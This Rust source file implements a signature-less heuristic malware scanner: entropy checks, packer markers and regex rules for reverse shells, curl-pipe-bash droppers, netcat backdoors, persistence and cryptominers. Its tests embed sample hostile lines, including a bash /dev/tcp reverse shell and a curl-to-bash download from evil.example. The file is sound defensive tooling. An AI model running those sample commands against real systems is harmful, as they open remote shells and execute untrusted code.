//! Heuristic engine — signature-less detection of *unknown* threats.
//!
//! Milestone-1 heuristics (all real, no placeholders):
//! * **Shannon entropy** on ELF/PE binaries → packed/encrypted payloads.
//! * **Packer markers** (UPX, Themida, ASPack).
//! * **Behavioural byte-patterns** in scripts/binaries: reverse shells,
//!   `curl|bash` droppers, netcat backdoors, persistence writes, destructive
//!   commands, obfuscated `eval`/base64.
//!
//! Findings are scored conservatively (LOW/MEDIUM, HIGH only for unambiguous
//! reverse-shell/destructive patterns) so the whitelist and multi-engine
//! consensus stay meaningful. Deeper ELF-section analysis (goblin) and eBPF
//! behavioural tracing arrive in Milestone 3.

use crate::engine::{Engine, FileContext};
use aegis_core::{Detection, Severity, ThreatClass};
use regex::bytes::Regex;
use std::sync::OnceLock;

/// Compute Shannon entropy (bits/byte, 0.0–8.0) of a buffer.
pub fn shannon_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut freq = [0u64; 256];
    for &b in data {
        freq[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0f64;
    for &c in freq.iter() {
        if c > 0 {
            let p = c as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

struct Pattern {
    re: Regex,
    threat: &'static str,
    reason: &'static str,
    severity: Severity,
    class: ThreatClass,
    /// Whether this pattern is meaningful inside a compiled ELF/PE binary.
    ///
    /// Most behavioural patterns describe *interpreted* intent (a bash/python
    /// one-liner). Those strings appearing incidentally inside a compiled
    /// binary — e.g. `/etc/cron` in a keyring GUI or `LD_PRELOAD=` in a wrapper —
    /// are not evidence of malice and were the source of false positives on
    /// system binaries. Such patterns run on scripts/text only. Traits that are
    /// genuinely damning even in a binary (cryptominer pool strings) set this to
    /// `true`.
    binary_ok: bool,
}

fn patterns() -> &'static [Pattern] {
    static PATTERNS: OnceLock<Vec<Pattern>> = OnceLock::new();
    PATTERNS.get_or_init(|| {
        let p = |re: &str, threat, reason, severity, class, binary_ok| Pattern {
            re: Regex::new(re).expect("valid heuristic regex"),
            threat,
            reason,
            severity,
            class,
            binary_ok,
        };
        vec![
            p(
                r"/dev/tcp/\d{1,3}(\.\d{1,3}){3}/\d+",
                "Suspicious.ReverseShell.Bash",
                "Bash reverse shell via /dev/tcp",
                Severity::High,
                ThreatClass::ReverseShell,
                false, // /dev/tcp is a bash feature — meaningless in a binary
            ),
            p(
                r"(?i)nc\s+-[a-z]*e\s+/bin/(sh|bash)",
                "Suspicious.ReverseShell.Netcat",
                "Netcat backdoor (nc -e)",
                Severity::High,
                ThreatClass::ReverseShell,
                false,
            ),
            p(
                r"(?is)socket\.socket\([^)]*\).{0,120}connect\([^)]*\).{0,200}(dup2|/bin/sh|/bin/bash)",
                "Suspicious.ReverseShell.Python",
                "Python reverse-shell pattern",
                Severity::High,
                ThreatClass::ReverseShell,
                false,
            ),
            p(
                r"(?i)(curl|wget)\s+[^\n|;&]{0,200}\|\s*(bash|sh|zsh|python)",
                "Suspicious.Dropper.PipeShell",
                "Remote payload piped to an interpreter",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)(base64\s+-d|base64\s+--decode)[^\n|]{0,60}\|\s*(bash|sh|python)",
                "Suspicious.Obfuscation.Base64Exec",
                "Base64-decoded content piped to a shell",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)eval\s*\(\s*(atob|Buffer\.from|base64_decode)",
                "Suspicious.Obfuscation.Eval",
                "eval() of decoded/obfuscated payload",
                Severity::Medium,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                r"(?i)(os\.system|subprocess\.(call|Popen|run))\([^)]{0,80}(rm\s+-rf\s+/|mkfs|dd\s+if=)",
                "Suspicious.Destructive.Command",
                "Destructive system command",
                Severity::High,
                ThreatClass::Heuristic,
                false,
            ),
            p(
                // Require write/install *intent* (redirect into, or piping to
                // crontab) rather than a mere mention, so legitimate scripts
                // that only reference these paths are not flagged.
                r"(?i)((>>?)\s*\S{0,40}(/etc/cron|\.ssh/authorized_keys)|\|\s*crontab\s+-)",
                "Suspicious.Persistence",
                "Writes to a persistence location (cron/authorized_keys)",
                Severity::Low,
                ThreatClass::Persistence,
                false,
            ),
            p(
                r"(?i)(stratum\+tcp://|--donate-level|cryptonight|xmrig)",
                "Suspicious.CryptoMiner",
                "Cryptominer configuration strings",
                Severity::High,
                ThreatClass::CryptoMiner,
                true, // miner pool strings are damning even inside an ELF
            ),
            p(
                // Only flag LD_PRELOAD pointing at a writable/temp/hidden path —
                // the actual injection pattern. Legitimate wrappers preload from
                // system library paths, which this ignores.
                r#"(?i)LD_PRELOAD\s*=\s*["']?(/tmp/|/dev/shm/|/var/tmp/|/run/shm/)"#,
                "Suspicious.LdPreload",
                "LD_PRELOAD from a temporary path (injection)",
                Severity::Low,
                ThreatClass::Heuristic,
                false,
            ),
        ]
    })
}

const PACKER_MARKERS: &[(&[u8], &str)] = &[
    (b"UPX!", "UPX-packed executable"),
    (b"$Info: This file is packed", "UPX-packed executable"),
    (b".themida", "Themida-protected"),
    (b"aspack", "ASPack-packed"),
];

#[derive(Debug)]
pub struct HeuristicEngine {
    entropy_threshold: f64,
}

impl HeuristicEngine {
    pub fn new(entropy_threshold: f64) -> Self {
        Self { entropy_threshold }
    }
}

impl Default for HeuristicEngine {
    fn default() -> Self {
        Self::new(7.2)
    }
}

impl Engine for HeuristicEngine {
    fn name(&self) -> &str {
        "Heuristic"
    }

    fn status(&self) -> String {
        format!(
            "ready · entropy≥{:.1}, {} behaviour rules",
            self.entropy_threshold,
            patterns().len()
        )
    }

    fn scan(&self, ctx: &FileContext<'_>) -> Vec<Detection> {
        let data = ctx.data;
        if data.is_empty() {
            return Vec::new();
        }
        let mut out = Vec::new();

        let head = &data[..data.len().min(512)];
        let is_elf = head.starts_with(b"\x7fELF");
        let is_pe = head.starts_with(b"MZ");
        let is_binary = head.contains(&0u8);

        // 1. Packer markers.
        let scan_head = &data[..data.len().min(65536)];
        for (marker, reason) in PACKER_MARKERS {
            if find_bytes(scan_head, marker) {
                out.push(Detection::new(
                    "Heuristic",
                    "Packed.Executable",
                    Severity::Medium,
                    ThreatClass::PackedBinary,
                    *reason,
                ));
                break;
            }
        }

        // 2. Entropy on executables.
        if is_elf || is_pe {
            let sample = &data[..data.len().min(1024 * 1024)];
            let ent = shannon_entropy(sample);
            if ent >= self.entropy_threshold {
                out.push(Detection::new(
                    "Heuristic",
                    "Suspicious.HighEntropy",
                    Severity::Low,
                    ThreatClass::PackedBinary,
                    format!("Executable entropy {ent:.2} — likely packed/encrypted"),
                ));
            }
        }

        // 3. Behavioural byte patterns. Script-intent patterns run on text/
        //    script content only; a pattern must opt in (`binary_ok`) to be
        //    evaluated against a compiled ELF/PE, which avoids false positives
        //    from incidental strings inside system binaries.
        let is_executable = is_elf || is_pe;
        let is_texty = !is_binary; // no NUL byte in the header → text/script
        {
            let region = &data[..data.len().min(1024 * 1024)];
            for pat in patterns() {
                let applicable = is_texty || (is_executable && pat.binary_ok);
                if applicable && pat.re.is_match(region) {
                    out.push(Detection::new(
                        "Heuristic",
                        pat.threat,
                        pat.severity,
                        pat.class,
                        pat.reason,
                    ));
                }
            }
        }

        out
    }
}

/// Naive substring search over bytes (buffers here are small/capped).
fn find_bytes(haystack: &[u8], needle: &[u8]) -> bool {
    if needle.is_empty() || haystack.len() < needle.len() {
        return false;
    }
    haystack.windows(needle.len()).any(|w| w == needle)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn ctx<'a>(data: &'a [u8]) -> FileContext<'a> {
        FileContext {
            path: Path::new("/x"),
            data,
            size: data.len() as u64,
            sha256: "",
        }
    }

    #[test]
    fn entropy_bounds() {
        assert!(shannon_entropy(b"") == 0.0);
        assert!(shannon_entropy(&[0u8; 1000]) < 0.01);
        let random: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(shannon_entropy(&random) > 7.9);
    }

    #[test]
    fn detects_bash_reverse_shell() {
        let eng = HeuristicEngine::default();
        let d = eng.scan(&ctx(
            b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",
        ));
        assert!(d.iter().any(|x| x.threat.contains("ReverseShell")));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let eng = HeuristicEngine::default();
        let d = eng.scan(&ctx(b"curl http://evil.example/x.sh | bash"));
        assert!(d.iter().any(|x| x.threat.contains("Dropper")));
    }

    #[test]
    fn clean_text_is_clean() {
        let eng = HeuristicEngine::default();
        assert!(eng.scan(&ctx(b"just some ordinary notes here")).is_empty());
    }

    /// A synthetic ELF containing a benign `/etc/cron` string (like a real
    /// keyring GUI) must NOT be flagged for persistence — this was the
    /// system-binary false positive.
    #[test]
    fn elf_with_incidental_cron_string_is_not_flagged() {
        let mut data = Vec::new();
        data.extend_from_slice(b"\x7fELF\x02\x01\x01\0");
        data.extend_from_slice(&[0u8; 32]); // binary content (NUL bytes)
        data.extend_from_slice(b"open /etc/cron.d/session for editing\0");
        data.extend_from_slice(b"LD_PRELOAD=libfoo.so wrapper\0");
        let d = HeuristicEngine::default().scan(&ctx(&data));
        assert!(
            !d.iter().any(|x| x.threat.contains("Persistence")),
            "persistence string in an ELF must not fire: {d:?}"
        );
        assert!(!d.iter().any(|x| x.threat.contains("LdPreload")));
    }

    /// The same string in an actual shell script SHOULD be flagged.
    #[test]
    fn script_with_cron_string_is_flagged() {
        let d = HeuristicEngine::default()
            .scan(&ctx(b"#!/bin/sh\necho '* * * * * evil' | crontab -\n"));
        assert!(d.iter().any(|x| x.threat.contains("Persistence")));
    }

    /// Cryptominer pool strings are damning even inside a binary.
    #[test]
    fn elf_with_miner_strings_is_flagged() {
        let mut data = Vec::new();
        data.extend_from_slice(b"\x7fELF\x02\x01\x01\0");
        data.extend_from_slice(&[0u8; 16]);
        data.extend_from_slice(b"stratum+tcp://pool.evil:3333\0xmrig\0");
        let d = HeuristicEngine::default().scan(&ctx(&data));
        assert!(d.iter().any(|x| x.threat.contains("CryptoMiner")));
    }
}
